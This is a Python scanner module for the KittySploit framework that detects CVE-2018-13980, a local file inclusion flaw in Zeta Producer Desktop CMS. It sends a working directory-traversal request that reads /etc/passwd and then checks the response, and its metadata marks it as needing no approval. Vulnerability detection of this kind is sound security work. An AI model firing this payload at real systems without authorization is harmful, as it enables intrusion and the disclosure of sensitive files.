#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zeta Producer Desktop CMS before 14."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zeta Producer Desktop CMS <14.2.1 - Local File Inclusion Detection',
        'description': 'Zeta Producer Desktop CMS before 14.2.1 is vulnerable to local file inclusion if the plugin "filebrowser" is installed because of assets/php/filebrowser/filebrowser.main.php?file=../ directory traversal.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'lfi', 'edb', 'packetstorm', 'zeta-producer', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45016',
            'https://www.sec-consult.com/en/blog/advisories/remote-code-execution-local-file-disclosure-zeta-producer-desktop-cms/',
            'http://packetstormsecurity.com/files/148537/Zeta-Producer-Desktop-CMS-14.2.0-Code-Execution-File-Disclosure.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-13980',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-13980',
    }

    def run(self):
        r = self.http_request(method="GET", path='/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd&do=download', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Zeta Producer Desktop CMS <14.2.1 - Local File Inclusion detected",
                path='/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd&do=download',
            )
            return True
        return False

